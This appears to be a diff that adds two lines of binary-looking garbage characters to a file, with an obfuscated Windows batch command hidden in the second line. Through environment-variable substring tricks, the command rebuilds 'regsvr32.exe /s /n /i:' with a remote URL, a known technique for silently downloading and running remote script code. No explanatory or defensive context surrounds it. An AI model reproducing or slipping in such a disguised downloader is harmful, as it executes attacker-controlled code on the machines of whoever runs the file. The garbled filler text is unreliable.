@@ -1,0 +1,2 @@
+ ÷ J { $ ? √   $ π , W ? j l "  1 m  ? ¢  ¶  ß Å ) X ¸ < L U ¡ - ‚ › ? t Ò Ó  — / ¢ ~   !  L
+ @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://wNKJEdMkBVYQPsfnDASmGbCopiytUaj%ALLUSERSPROFILE:~4,1%zHOcFquLlgTeWIZ%ALLUSERSPROFILE:~4,1%Xxhv.com/n0tm4lw4%ALLUSERSPROFILE:~4,1%3  ÷ J { $ ? √   $ π , W ? j l "  1 m  ? ¢  ¶  ß Å ) X ¸ < L U ¡ - ‚ › ? t Ò Ó  — / ¢ ~   !  L
